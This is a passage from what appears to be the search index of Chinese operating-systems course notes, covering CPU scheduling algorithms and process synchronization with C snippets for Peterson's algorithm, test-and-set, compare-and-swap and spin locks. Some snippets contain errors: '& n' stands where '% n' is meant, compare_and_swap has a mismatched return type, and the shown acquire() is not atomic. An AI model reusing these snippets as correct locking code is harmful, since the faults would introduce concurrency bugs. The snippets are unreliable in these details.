scheduling\uff09\uff1a\u6839\u636e\u4f18\u5148\u7ea7\u6765\u8c03\u5ea6</p> <ul> <li>\u4e3a\u6bcf\u4e00\u4e2a\u8fdb\u7a0b\u8bc4\u4f30\u4e00\u4e2a\u4f18\u5148\u7ea7</li> <li>\u6700\u9ad8\u4f18\u5148\u7ea7\u7684\u8fdb\u7a0b\u4f18\u5148\u8fdb\u884c</li> <li>SJF \u662f\u4f18\u5148\u7ea7\u8c03\u5ea6\u7684\u4e00\u79cd\u7279\u4f8b<ul> <li>\u5373\u4ee4\u9884\u6d4b\u4e0b\u4e00\u4e2a CPU burst \u6700\u77ed\u7684\u8fdb\u7a0b\u4f18\u5148\u7ea7\u66f4\u9ad8</li> </ul> </li> <li>\u540c\u6837\u53ef\u4ee5\u662f\u62a2\u5360\u5f0f\u7684\u4e5f\u53ef\u4ee5\u662f\u975e\u62a2\u5360\u5f0f\u7684</li> <li>\u4f18\u5148\u7ea7\u8c03\u5ea6\u7b97\u6cd5\u7684\u5f0a\u7aef\u662f\u53ef\u80fd\u4f1a\u5bfc\u81f4\u201c\u9965\u997f\u201d\uff08starvation\uff09<ul> <li>\u5373\u4f4e\u4f18\u5148\u7ea7\u7684\u8fdb\u7a0b\u53ef\u80fd\u6c38\u8fdc\u4e0d\u4f1a\u88ab\u6267\u884c</li> <li>\u89e3\u51b3\u65b9\u6848\u662f\u5f15\u5165 aging\uff0c\u7b49\u5f85\u65f6\u95f4\u8d8a\u957f\uff0c\u4f18\u5148\u7ea7\u4f1a\u63d0\u9ad8</li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic5/#_8","title":"\u65f6\u95f4\u7247\u8f6e\u8f6c\u8c03\u5ea6\u7b97\u6cd5","text":"<p>Round Robin\uff08RR\uff09\uff1a\u65f6\u95f4\u7247\u8f6e\u8f6c</p> <ul> <li>\u6bcf\u4e00\u4e2a\u8fdb\u7a0b\u90fd\u6709\u4e00\u4e2a\u65f6\u95f4\u7247\uff08time quantum\uff09q</li> <li>\u5728\u65f6\u95f4\u7247\u7528\u5b8c\u4e4b\u540e\u4f1a\u88ab\u5207\u6362\u5230\u4e0b\u4e00\u4e2a\u8fdb\u7a0b<ul> <li>\u4e5f\u5c31\u662f\u8bf4\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u4f1a\u88ab\u6267\u884c q \u65f6\u95f4</li> </ul> </li> <li>\u65f6\u95f4\u7247 q \u7684\u5927\u5c0f\u4f1a\u5f71\u54cd\u5230\u6027\u80fd<ul> <li>q \u592a\u5927\uff0c\u76f8\u5f53\u4e8e\u9000\u5316\u5230 FCFS</li> <li>q \u592a\u5c0f\uff0c\u5207\u6362\u8fc7\u4e8e\u9891\u7e41\uff0c\u4e0a\u4e0b\u6587\u5207\u6362\u7684\u5f00\u9500\u8fc7\u5927</li> <li>\u901a\u5e38\u662f 10-100 ms</li> </ul> </li> <li>\u4e00\u5b9a\u662f\u62a2\u5360\u5f0f\u7684\u8c03\u5ea6</li> </ul>"},{"location":"cs/system/cs2/topic5/#_9","title":"\u591a\u7ea7\u961f\u5217\u8c03\u5ea6\u7b97\u6cd5","text":"<p>Multi-level Queue Scheduling\uff1a\u591a\u7ea7\u961f\u5217\u8c03\u5ea6\u7b97\u6cd5</p> <ul> <li>ready queue \u88ab\u5206\u6210\u591a\u4e2a\u961f\u5217<ul> <li>\u6bd4\u5982\u5206\u6210\u4ea4\u4e92\u6027\u961f\u5217\u548c\u6279\u5904\u7406\u961f\u5217</li> </ul> </li> <li>\u4e00\u4e2a\u8fdb\u7a0b\u4f1a\u88ab\u6c38\u4e45\u5730\u5206\u5230\u4e00\u4e2a\u961f\u5217\u4e2d</li> <li>\u6bcf\u4e2a\u961f\u5217\u53ef\u4ee5\u6709\u81ea\u5df1\u7684\u8c03\u5ea6\u7b97\u6cd5<ul> <li>\u4f8b\u5982\uff0c\u9ad8\u4ea4\u4e92\u6027\u7684\u8fdb\u7a0b\u961f\u5217\u53ef\u4ee5\u4f7f\u7528 RR \u7b97\u6cd5\uff0c\u4f4e\u4ea4\u4e92\u7684\u6279\u5904\u7406\u961f\u5217\u53ef\u4ee5\u4f7f\u7528 FCFS \u7b97\u6cd5</li> </ul> </li> <li>\u961f\u5217\u4e4b\u95f4\u4e5f\u9700\u8981\u8fdb\u884c\u8c03\u5ea6<ul> <li>\u53ef\u4ee5\u662f\u56fa\u5b9a\u4f18\u5148\u7ea7\u7684\u8c03\u5ea6\uff0c\u4f46\u662f\u4f1a\u5bfc\u81f4\u9965\u997f</li> <li>\u53ef\u4ee5\u901a\u8fc7\u65f6\u95f4\u7247\u8f6e\u8f6c\u6765\u8c03\u5ea6</li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic5/#_10","title":"\u591a\u7ea7\u53cd\u9988\u961f\u5217\u8c03\u5ea6\u7b97\u6cd5","text":"<p>Multi-level Feedback Queue Scheduling\uff1a\u591a\u7ea7\u53cd\u9988\u961f\u5217\u8c03\u5ea6\u7b97\u6cd5</p> <ul> <li>\u548c\u591a\u7ea7\u961f\u5217\u8c03\u5ea6\u7684\u533a\u522b\u662f\u4e00\u4e2a\u8fdb\u7a0b\u53ef\u4ee5\u5728\u4e0d\u540c\u7684\u961f\u5217\u4e4b\u95f4\u8fdb\u884c\u8fc1\u79fb</li> <li>\u5c1d\u8bd5\u63a8\u6d4b\u8fdb\u7a0b\u7684\u6027\u8d28<ul> <li>\u5373\u662f\u4ea4\u4e92\u6027\u7684\u8fd8\u662f\u6279\u5904\u7406\u7684</li> </ul> </li> <li>aging \u4e5f\u53ef\u4ee5\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u6765\u5b9e\u73b0</li> <li>\u76ee\u7684\u662f\u6765\u7ed9\u4ea4\u4e92\u6027\u3001I/O intensive \u7684\u8fdb\u7a0b\u66f4\u9ad8\u7684\u8c03\u5ea6\u4f18\u5148\u7ea7</li> <li>\u662f\u6700\u901a\u7528\u7684\u8c03\u5ea6\u7b97\u6cd5</li> </ul>"},{"location":"cs/system/cs2/topic5/#_11","title":"\u591a\u5904\u7406\u5668\u8c03\u5ea6","text":"<ul> <li>\u4e24\u79cd\u591a\u5904\u7406\u5668\u8c03\u5ea6\u65b9\u5f0f<ul> <li>asymmetric multiprocessing<ul> <li>\u53ea\u6709\u4e00\u4e2a\u5904\u7406\u5668\u7528\u6765\u51b3\u7b56\u8c03\u5ea6\uff0c\u5904\u7406 I/O\uff0c\u4ee5\u53ca\u5176\u4ed6\u7684\u6d3b\u52a8</li> <li>\u5176\u5b83\u5904\u7406\u5668\u4f5c\u4e3a\u6267\u884c\u5355\u5143</li> </ul> </li> <li>symmetric multiprocessing\uff08SMP\uff09<ul> <li>\u6bcf\u4e2a\u5904\u7406\u5668\u90fd\u5728\u505a\u81ea\u5df1\u7684\u8c03\u5ea6</li> <li>\u6240\u6709\u7ebf\u7a0b\u53ef\u80fd\u90fd\u5728\u540c\u4e00\u4e2a ready queue \u4e2d\uff08\u6240\u6709 core \u5171\u4eab\uff09\uff0c\u4e5f\u6709\u53ef\u80fd\u4e0d\u540c core \u6709\u81ea\u5df1\u7684 ready queue</li> <li>\u5e38\u89c1\u7684\u64cd\u4f5c\u7cfb\u7edf\u7528\u7684\u90fd\u662f\u8fd9\u79cd\u65b9\u5f0f</li> </ul> </li> </ul> </li> <li>\u786c\u4ef6\u7ebf\u7a0b chip multitreading\uff08CMT\uff09\u6280\u672f<ul> <li>\u5728\u4e00\u4e2a CPU core \u4e2d\u8fd0\u884c\u4e24\u4e2a\u786c\u4ef6\u7ebf\u7a0b</li> <li>\u4e24\u4e2a\u786c\u4ef6\u7ebf\u7a0b\u5171\u4eab CPU \u7684\u6267\u884c\u5355\u5143\uff0c\u4f46\u662f\u6709\u81ea\u5df1\u7684\u4e0a\u4e0b\u6587</li> <li>\u4f9d\u9760 memory stall \u6765\u5b9e\u73b0<ul> <li>\u8bbf\u95ee memory \u662f\u8f83\u6162\u7684</li> <li>\u5728\u4e00\u4e2a\u786c\u4ef6\u7ebf\u7a0b\u8bbf\u95ee memory \u7684\u65f6\u5019\u53ef\u4ee5\u8c03\u5ea6\u53e6\u4e00\u4e2a\u786c\u4ef6\u7ebf\u7a0b\u6267\u884c</li> </ul> </li> <li>\u6bcf\u4e2a\u5904\u7406\u5668\u7684\u903b\u8f91 CPU \u6570 = \u5904\u7406\u5668\u4e2d\u6838\u5fc3\u6570 * \u6bcf\u4e2a\u6838\u5fc3\u4e2d\u786c\u4ef6\u7ebf\u7a0b\u4e2a\u6570</li> <li>\u4e24\u7ea7\u8c03\u5ea6<ul> <li>\u64cd\u4f5c\u7cfb\u7edf\u51b3\u7b56\u54ea\u4e2a\u8f6f\u4ef6\u7ebf\u7a0b\u5728\u903b\u8f91 CPU \u4e0a\u8fd0\u884c</li> <li>CPU \u51b3\u5b9a\u5982\u4f55\u5728\u7269\u7406 core \u4e0a\u8fd0\u884c\u786c\u4ef6\u7ebf\u7a0b<ul> <li>\u4f8b\u5982\u907f\u514d\u5c06\u4e24\u4e2a\u8ba1\u7b97\u5bc6\u96c6\u578b\u7684\u7ebf\u7a0b\u653e\u5728\u540c\u4e00\u4e2a core \u4e0a\uff08\u8fd9\u6837 memory stall \u7684\u6982\u7387\u4f1a\u51cf\u5c0f\uff09</li> </ul> </li> </ul> </li> </ul> </li> <li>Load Balancing \u8d1f\u8f7d\u5747\u8861<ul> <li>SMP \u60c5\u5883\u4e0b\u8ba9\u6240\u6709 CPU \u7684\u8d1f\u8f7d\u66f4\u52a0\u5e73\u5747</li> <li>\u4e24\u79cd\u65b9\u6cd5<ul> <li>push migration\uff1a\u5468\u671f\u6027\u68c0\u67e5\u6240\u6709\u5904\u7406\u5668\u4e0a\u7684\u8d1f\u8f7d\u60c5\u51b5\uff0c\u53d1\u73b0\u7a7a\u95f2\u7684\u5219\u5c06\u4efb\u52a1 push \u8fc7\u53bb</li> <li>pull migration\uff1a\u7a7a\u95f2\u7684\u5904\u7406\u5668\u4e3b\u52a8\u4ece\u7e41\u5fd9\u7684\u5904\u7406\u5668\u4e0a\u62c9\u6765\u4efb\u52a1</li> </ul> </li> </ul> </li> <li>Processor Affinity \u5904\u7406\u5668\u4eb2\u6838\u6027<ul> <li>\u5f53\u4e00\u4e2a\u7ebf\u7a0b\u5728\u4e00\u4e2a CPU \u4e0a\u8fd0\u884c\u4e00\u6bb5\u65f6\u95f4\u4e4b\u540e\uff0ccache \u5185\u5bb9\u4f1a\u88ab\u5f53\u524d\u7ebf\u7a0b\u586b\u5145</li> <li>\u5982\u679c\u4e3a\u4e86\u8d1f\u8f7d\u5747\u8861\u800c\u5c06\u8fd9\u4e2a\u7ebf\u7a0b migrate \u5230\u5176\u5b83\u5904\u7406\u5668\u4e0a\uff0c\u4f1a\u56e0\u4e3a cache miss \u5bfc\u81f4\u6548\u7387\u4e0b\u964d</li> <li>\u4e24\u79cd\u673a\u5236<ul> <li>soft affinity\uff1a\u64cd\u4f5c\u7cfb\u7edf\u5c3d\u53ef\u80fd\u4fdd\u6301\u7ebf\u7a0b\u5728\u540c\u4e00\u4e2a\u5904\u7406\u5668\u4e0a\u8fd0\u884c\uff0c\u4f46\u4e0d\u4fdd\u8bc1\uff08\u4f8b\u5982\u8d1f\u8f7d\u5b9e\u5728\u4e0d\u5747\u8861\uff09</li> <li>hard affinity\uff1a\u5f3a\u5236\u89c4\u5b9a\u4e00\u4e2a\u7ebf\u7a0b\u53ea\u80fd\u5728\u54ea\u4e9b\u5904\u7406\u5668\u4e0a\u8fd0\u884c</li> </ul> </li> </ul> </li> <li>NUMA \u67b6\u6784\u7cfb\u7edf<ul> <li>NUMA \u4e0b\u6bcf\u4e2a CPU \u6709\u81ea\u5df1\u5bf9\u5e94\u7684 memory\uff0c\u53ef\u4ee5\u5feb\u901f\u8bbf\u95ee\uff0c\u4e5f\u53ef\u4ee5\u8bbf\u95ee\u5176\u5b83 CPU \u7684 memory \u4e0d\u8fc7\u901f\u5ea6\u8f83\u6162</li> <li>NUMA-aware \u7684\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u5728\u8c03\u5ea6\u7684\u65f6\u5019\u5c3d\u53ef\u80fd\u7684\u907f\u514d\u8de8 CPU \u7684 memory \u8bbf\u95ee</li> </ul> </li> <li>\u5b9e\u65f6\u64cd\u4f5c\u7cfb\u7edf\u8c03\u5ea6<ul> <li>soft real-time systems \u8f6f\u5b9e\u65f6\uff1a\u5c06\u5173\u952e\u7684\u5b9e\u65f6\u4efb\u52a1\u63d0\u9ad8\u4f18\u5148\u7ea7\uff0c\u4f46\u5e76\u4e0d\u4fdd\u8bc1\u5982\u4f55\u8c03\u5ea6<ul> <li>\u4f8b\u5982 Linux \u5c31\u662f\u8f6f\u5b9e\u65f6\u64cd\u4f5c\u7cfb\u7edf</li> <li>Linux \u65e0\u6cd5\u8fbe\u5230\u786c\u5b9e\u65f6\uff1a\u56e0\u4e3a\u786c\u5b9e\u65f6\u4e00\u5b9a\u8981\u80fd\u7cbe\u786e\u63a7\u5236\u975e\u9884\u671f\u4e8b\u4ef6\u7684\u4ea7\u751f\uff08\u4f8b\u5982\u4e2d\u65ad\uff09</li> </ul> </li> <li>hard real-time systems \u786c\u5b9e\u65f6\uff1a\u89c4\u5b9a\u4efb\u52a1\u5fc5\u987b\u5728\u5b83\u7684 ddl \u4e4b\u524d\u5b8c\u6210\u6267\u884c\uff0c\u5982\u679c\u8d85\u65f6\u4e86\uff0c\u7cfb\u7edf watchdog \u90e8\u4ef6\u4f1a\u5bdf\u89c9\u5230\u7cfb\u7edf\u6709\u5f02\u5e38\uff0c\u4f1a\u5c06\u7cfb\u7edf reboot \u6765\u6062\u590d\u4fdd\u8bc1\u5b9e\u65f6\u6027</li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic6/","title":"\u8fdb\u7a0b\u540c\u6b65","text":"<p> \u7ea6 1575 \u4e2a\u5b57  122 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2161 \u7b2c 14 \u81f3 15 \u5468\u8bfe\u7a0b\u5185\u5bb9</p>"},{"location":"cs/system/cs2/topic6/#_2","title":"\u80cc\u666f","text":"<ul> <li>\u8fdb\u7a0b\u662f\u53ef\u4ee5\u5e76\u53d1\u6267\u884c\u7684<ul> <li>\u5728\u8fd9\u91cc\u4e5f\u4e0d\u533a\u5206\u8fdb\u7a0b\u548c\u7ebf\u7a0b</li> </ul> </li> <li>\u8fdb\u7a0b\u5728\u6267\u884c\u7684\u65f6\u5019\u53ef\u80fd\u4f1a\u88ab\u968f\u65f6\u6253\u65ad<ul> <li>\u5e76\u53d1\u8bbf\u95ee\u5171\u4eab\u7684\u8d44\u6e90\u53ef\u80fd\u4f1a\u5bfc\u81f4\u6570\u636e\u4e0d\u4e00\u81f4\u6027\uff08data inconsistency\uff09</li> </ul> </li> </ul> <p>\u6bd4\u5982\uff0c\u8fdb\u7a0b\u4e2d\u521b\u5efa\u4e86\u4e24\u4e2a\u7ebf\u7a0b\uff0c\u5206\u522b\u5bf9\u5171\u4eab\u7684\u5168\u5c40\u53d8\u91cf counter \u8fdb\u884c\u5faa\u73af + 1\uff1a <pre><code>static volatile int counter = 0;\nvoid *mythread(void *arg) {\n    printf(\"%s: begin\\n\", (char*)arg);\n    int i;\n    for (i = 0; i &lt; 1e7; i++) {\n        counter = counter + 1;\n    }\n    printf(\"%s: done\\n\", (char*)arg);\n    return NULL;\n}\n</code></pre> \u6700\u540e\u5728\u4e24\u4e2a\u7ebf\u7a0b\u7ed3\u675f\u7684\u65f6\u5019\uff0ccounter \u503c\u4f1a\u5c0f\u4e8e 2e7\u3002\u539f\u56e0\uff1a</p> <ul> <li><code>counter = counter + 1</code> \u5728 C \u8bed\u8a00\u91cc\u662f\u4e00\u6761\u8bed\u53e5</li> <li>\u4f46\u662f\u5728\u6c47\u7f16\u5c42\u9762\u5e76\u4e0d\u662f\u539f\u5b50\u64cd\u4f5c\uff0c\u6709\u4e09\u6761\u8bed\u53e5\u6765\u5b8c\u6210\u8fd9\u4e00\u64cd\u4f5c\uff1a     <pre><code>mov eax, &lt;addr of counter&gt;\nadd eax, 1\nmov &lt;addr of counter&gt; eax\n</code></pre><ul> <li>\u5206\u522b\u8fdb\u884c \u8bfb\u3001\u52a0\u4e00\u3001\u5199</li> </ul> </li> <li>\u5982\u679c\u4e00\u4e2a\u7ebf\u7a0b\u5728\u5199\u4e4b\u524d\u88ab\u6253\u65ad\u7136\u540e\u6267\u884c\u53e6\u4e00\u4e2a\u7ebf\u7a0b\u4e86\uff0c\u4f1a\u4ea7\u751f\u5982\u4e0b\u95ee\u9898\uff1a     <pre><code>    Thread 1      OS      Thread 2\n---------------- ---- ----------------\n  read (eax=50)\n    +1 (eax=51) \n                  -&gt;\n                        read (eax=50)\n                          +1 (eax=51)\n                       write (51)\n                  &lt;-\n write (51)\n</code></pre><ul> <li>\u4e24\u4e2a\u7ebf\u7a0b\u90fd\u8bfb\u5230\u4e86 50\uff0c\u7136\u540e\u90fd\u52a0\u4e86\u4e00\uff0c\u6700\u540e\u90fd\u5199\u56de\u4e86 51</li> <li>\u867d\u7136\u4e24\u4e2a\u7ebf\u7a0b\u90fd\u88ab\u6267\u884c\u4e86\u4e00\u6b21\uff0c\u4f46\u6700\u540e counter \u7684\u503c\u53ea\u52a0\u4e86 1</li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic6/#_3","title":"\u6761\u4ef6\u7ade\u4e89","text":"<ul> <li>\u51e0\u4e2a\u8fdb\u7a0b\u5e76\u53d1\u5730\u8bbf\u95ee\u3001\u4fee\u6539\u540c\u4e00\u4e2a\u5171\u4eab\u53d8\u91cf\uff0c\u5176\u7ed3\u679c\u53d6\u51b3\u4e8e\u8bbf\u95ee\u7684\u987a\u5e8f\uff0c\u8fd9\u79cd\u60c5\u51b5\u79f0\u4e3a\u6761\u4ef6\u7ade\u4e89\uff08race condition\uff09</li> <li>\u5982\u4e0a\u5c31\u662f\u4e00\u4e2a\u6761\u4ef6\u7ade\u4e89\u7684\u4f8b\u5b50</li> <li>\u5185\u6838\u4e2d\u4e5f\u4f1a\u53d1\u751f\u6761\u4ef6\u7ade\u4e89<ul> <li>\u4f8b\u5982\u4e24\u4e2a\u8fdb\u7a0b\u90fd\u5728 fork \u5b50\u8fdb\u7a0b\uff0c\u8bf7\u6c42\u65b0\u7684\u8fdb\u7a0b\u53f7</li> <li>\u8fdb\u7a0b\u53f7\u7531\u5185\u6838\u5168\u5c40\u53d8\u91cf next_available_pid \u7ef4\u62a4</li> <li>\u5185\u6838\u5e76\u53d1\u5904\u7406\u4e24\u4e2a fork \u8bf7\u6c42\u65f6\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4\u4e24\u4e2a\u8fdb\u7a0b\u5f97\u5230\u76f8\u540c\u7684\u8fdb\u7a0b\u53f7</li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic6/#critical-section","title":"Critical Section","text":"<ul> <li>\u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u6709\u4e00\u4e2a\u4e34\u754c\u533a\uff08critical section\uff0cCS\uff09<ul> <li>\u4f8b\u5982\u8bbf\u95ee\u5171\u4eab\u53d8\u91cf</li> </ul> </li> <li>\u5728\u540c\u4e00\u65f6\u523b\uff0c\u53ea\u6709\u4e00\u4e2a\u8fdb\u7a0b\u53ef\u4ee5\u5904\u5728 critical section</li> <li>\u5728\u8fdb\u5165 critical section \u4e4b\u524d\u9700\u8981\u8bf7\u6c42\u8fdb\u5165 CS \u7684\u6743\u9650\uff0c\u8fd9\u90e8\u5206\u4ee3\u7801\u79f0\u4e3a entry section</li> <li>\u9000\u51fa CS \u540e\u91ca\u653e\u6743\u9650\uff0c\u8fd9\u90e8\u5206\u4ee3\u7801\u79f0\u4e3a exit section</li> <li>\u5269\u4e0b\u7684\u90e8\u5206\u79f0\u4e3a remainder section</li> <li>\u8fdb\u7a0b p \u7684\u4e00\u4e2a\u901a\u7528\u7ed3\u6784\uff1a     <pre><code>do {\n    entry section;\n    critical section;\n    exit section;\n    remainder section;\n} while (true);\n</code></pre></li> </ul>"},{"location":"cs/system/cs2/topic6/#cs","title":"\u89e3\u51b3 CS \u95ee\u9898\u7684\u4e09\u4e2a\u6761\u4ef6","text":"<ul> <li>Mutual Exclusion\uff08\u4e92\u65a5\uff0cME\uff09<ul> <li>\u4efb\u610f\u65f6\u523b\u53ea\u6709\u4e00\u4e2a\u8fdb\u7a0b\u5728 CS \u4e2d</li> </ul> </li> <li>Progress<ul> <li>\u5982\u679c\u6ca1\u6709\u8fdb\u7a0b\u5728 CS \u4e14\u6709\u8fdb\u7a0b\u9700\u8fdb\u5165 CS\uff0c\u90a3\u4e48\u53ea\u6709\u90a3\u4e48\u4e0d\u5728 remainder section \u5185\u6267\u884c\u7684\u8fdb\u7a0b\u53ef\u53c2\u52a0\u9009\u62e9\uff0c\u4ee5\u786e\u5b9a\u8c01\u80fd\u4e0b\u4e00\u4e2a\u8fdb\u5165 CS\uff0c\u4e14\u8fd9\u79cd\u9009\u62e9\u4e0d\u80fd\u65e0\u9650\u63a8\u8fdf</li> </ul> </li> <li>Bounded Waiting<ul> <li>\u4ece\u4e00\u4e2a\u8fdb\u7a0b\u505a\u51fa\u8fdb\u5165 CS \u7684\u8bf7\u6c42\uff0c\u76f4\u5230\u8be5\u8bf7\u6c42\u5141\u8bb8\u4e3a\u6b62\uff0c\u5176\u4ed6\u8fdb\u7a0b\u5141\u8bb8\u8fdb\u5165\u5176 CS \u7684\u6b21\u6570\u6709\u4e0a\u9650</li> <li>\u9632\u6b62\u4e86\u9965\u997f\uff08starvation\uff09</li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic6/#peterson","title":"Peterson \u7b97\u6cd5","text":"<ul> <li>Peterson \u7b97\u6cd5\u89e3\u51b3\u4e86\u4e24\u4e2a\u8fdb\u7a0b\u7684\u540c\u6b65\u95ee\u9898</li> <li>\u5176\u5047\u8bbe load \u548c store \u662f\u539f\u5b50\u6027\uff08atomic\uff09\u7684<ul> <li>\u539f\u5b50\u6027\u5373\u4e0d\u53ef\u5206\u5272\uff0c\u4e2d\u9014\u4e0d\u80fd\u88ab\u6253\u65ad</li> </ul> </li> <li>\u4e24\u4e2a\u8fdb\u7a0b\u5171\u4eab\u4e24\u4e2a\u53d8\u91cf\uff1a<ul> <li><code>int turn</code>\uff1a\u6807\u8bb0\u5f53\u524d\u6b63\u5728 CS \u4e2d\u7684\u8fdb\u7a0b</li> <li><code>bool flag[2]</code>\uff1a\u6807\u8bb0\u8fdb\u7a0b\u662f\u5426\u60f3\u8fdb\u5165 CS</li> </ul> </li> <li>Process 0:     <pre><code>do {\n    flag[0] = true;\n    turn = 1;\n    while (flag[1] &amp;&amp; turn == 1);\n    // critical section\n    flag[0] = false;\n    // remainder section\n} while (true);\n</code></pre></li> <li>Process 1:     <pre><code>do {\n    flag[1] = true;\n    turn = 0;\n    while (flag[0] &amp;&amp; turn == 0);\n    // critical section\n    flag[1] = false;\n    // remainder section\n} while (true);\n</code></pre></li> <li>\u5728\u73b0\u4ee3\u4f53\u7cfb\u7ed3\u6784\u4e71\u5e8f\u6267\u884c\u4e0b\u4e0d\u80fd\u4fdd\u8bc1\u6b63\u5e38\u5de5\u4f5c</li> </ul>"},{"location":"cs/system/cs2/topic6/#_4","title":"\u540c\u6b65\u95ee\u9898\u7684\u786c\u4ef6\u652f\u6301","text":"<ul> <li>\u5355\u5904\u7406\u5668\uff1a\u53ef\u4ee5\u901a\u8fc7\u7981\u6b62\u4e2d\u65ad\u6765\u5b9e\u73b0<ul> <li>\u5373\u975e\u62a2\u5360\u5f0f\u5185\u6838</li> <li>\u5728\u591a\u5904\u7406\u5668\u4e2d\u6548\u7387\u4f4e</li> </ul> </li> <li>\u89e3\u51b3\u65b9\u6848\uff1a<ul> <li>\u5185\u5b58\u5c4f\u969c Memory Barrier</li> <li>\u786c\u4ef6\u6307\u4ee4<ul> <li>test-and-set \u6307\u4ee4</li> <li>compare-and-swap \u6307\u4ee4</li> </ul> </li> <li>\u539f\u5b50\u53d8\u91cf Atomic Variable</li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic6/#_5","title":"\u5185\u5b58\u5c4f\u969c","text":"<ul> <li>\u4e24\u79cd\u5185\u5b58\u6a21\u578b<ul> <li>Strongly ordered\uff1a\u4e00\u4e2a\u5904\u7406\u5668\u5bf9\u5185\u5b58\u7684\u4fee\u6539\u5bf9\u4e8e\u5176\u5b83\u5904\u7406\u5668\u7acb\u5373\u53ef\u89c1</li> <li>Weakly ordered\uff1a\u4e00\u4e2a\u5904\u7406\u5668\u5bf9\u5185\u5b58\u7684\u4fee\u6539\u5bf9\u4e8e\u5176\u5b83\u5904\u7406\u5668\u4e0d\u4e00\u5b9a\u7acb\u5373\u53ef\u89c1</li> </ul> </li> <li>\u5185\u5b58\u5c4f\u969c\uff08memory barrier\uff09\u662f\u4e00\u4e2a\u53ef\u4ee5\u5f3a\u5236\u4e00\u4e2a\u5904\u7406\u5668\u5bf9\u5185\u5b58\u7684\u4fee\u6539\u4f20\u64ad\u5230\u6240\u6709\u5904\u7406\u5668\u7684\u6307\u4ee4</li> </ul>"},{"location":"cs/system/cs2/topic6/#_6","title":"\u786c\u4ef6\u6307\u4ee4","text":"<ul> <li>test-and-set \u6307\u4ee4<ul> <li>\u8bed\u4e49\u4e3a\uff1a     <pre><code>bool test_set(bool *target) {\n    bool rv = *target;\n    *target = true;\n    return rv;\n}\n</code></pre></li> <li>\u6574\u4f53\u662f\u4e00\u4e2a\u539f\u5b50\u64cd\u4f5c</li> <li>\u7528\u4e8e\u5b9e\u73b0 Peterson \u7b97\u6cd5     <pre><code>do {\n    while (test_set(&amp;lock)); // busy wait\n    // critical section\n    lock = false;\n    // remainder section\n} while (true);\n</code></pre><ul> <li>\u8fd9\u79cd\u89e3\u6cd5\u4e0d\u6ee1\u8db3 Bounded Waiting\uff0c\u65e0\u6cd5\u4fdd\u8bc1 waiting \u7684\u4e00\u5b9a\u88ab\u6267\u884c\uff08\u53d6\u51b3\u4e8e\u8c03\u5ea6\uff09</li> </ul> </li> <li>\u6ee1\u8db3 Bounded Waiting \u7684\u89e3\u6cd5\uff1a     <pre><code>do {\n    waiting[i] = true;\n    while (waiting[i] &amp;&amp; test_set(&amp;lock));\n    waiting[i] = false;\n    // critical section\n    j = (j + 1) &amp; n;\n    while ((j != i) &amp;&amp; !waiting[j])\n        j = (j + 1) % n;\n    if (j == i) lock = false;\n    else waiting[j] = false;\n    // remainder section\n} while (true);\n</code></pre></li> </ul> </li> <li>compare-and-swap \u6307\u4ee4<ul> <li>\u8bed\u4e49\u4e3a\uff1a     <pre><code>bool compare_and_swap(int *ptr, int expected, int new_value) {\n    int rv = *ptr;\n    if (rv == expected) {\n        *ptr = new_value;\n    }\n    return rv;\n}\n</code></pre></li> <li>\u6574\u4f53\u662f\u4e00\u4e2a\u539f\u5b50\u64cd\u4f5c</li> <li>\u4f7f\u7528 compare-and-swap \u6307\u4ee4\u7684\u89e3\u6cd5     <pre><code>do {\n    while (compare_and_swap(&amp;lock, 0, 1) != 0);\n    // critical section\n    lock = 0;\n    // remainder section\n} while (true);\n</code></pre></li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic6/#_7","title":"\u539f\u5b50\u53d8\u91cf","text":"<ul> <li>\u63d0\u4f9b\u4e86\u5bf9\u4e8e\u6574\u578b\u3001\u6d6e\u70b9\u578b\u8fd9\u79cd\u57fa\u7840\u6570\u636e\u7c7b\u578b\u7684\u539f\u5b50\u6027\u4fee\u6539</li> <li>\u4f8b\u5982 <code>increment(&amp;sequence)</code> \u6765\u539f\u5b50\u6027\u589e\u52a0 <code>sequence</code> \u7684\u503c</li> <li>\u4f7f\u7528 compare-and-swap \u7684\u5b9e\u73b0\uff1a     <pre><code>void increment(int *sequence) {\n    int temp;\n    do {\n        temp = *sequence;\n    } while (compare_and_swap(sequence, temp, temp + 1) != temp);\n}\n</code></pre></li> </ul>"},{"location":"cs/system/cs2/topic6/#_8","title":"\u4e92\u65a5\u9501","text":"<ul> <li>\u524d\u9762\u7684\u65b9\u6cd5\u5728\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7f16\u5199\u592a\u590d\u6742</li> <li>OS \u8bbe\u8ba1\u8005\u901a\u8fc7\u8f6f\u4ef6\u5de5\u5177\u6765\u89e3\u51b3 CS \u95ee\u9898\uff0c\u6700\u7b80\u5355\u7684\u5c31\u662f\u4e92\u65a5\u9501\uff08mutex lock\uff09</li> <li>\u901a\u8fc7\u5148 acquire() \u9501\uff0c\u7136\u540e\u6267\u884c CS\uff0c\u518d release() \u9501\u6765\u4fdd\u62a4 CS</li> <li>acquire() \u548c release() \u5fc5\u987b\u662f\u539f\u5b50\u7684<ul> <li>\u901a\u8fc7\u786c\u4ef6\u539f\u5b50\u6307\u4ee4\u6765\u5b9e\u73b0</li> </ul> </li> <li>\u81ea\u65cb\u9501\uff08spin lock\uff09\u5b9e\u73b0     <pre><code>void acquire() {\n    while (!available); // busy wait\n    available = false;\n}\nvoid release() {\n    available = true;\n}\n</code></pre><ul> <li>\u901a\u8fc7\u5fd9\u7b49\u5f85\uff08busy waiting\uff09\u6765\u5b9e\u73b0</li> <li>\u4f46\u662f\u5fd9\u7b49\u5f85\u4f1a\u5f71\u54cd\u6548\u7387\uff08CPU \u4f1a\u4e00\u76f4\u6267\u884c\u7b49\u5f85\u7684 while \u5faa\u73af\uff09\u5373\u5f88\u591a\u81ea\u65cb</li> 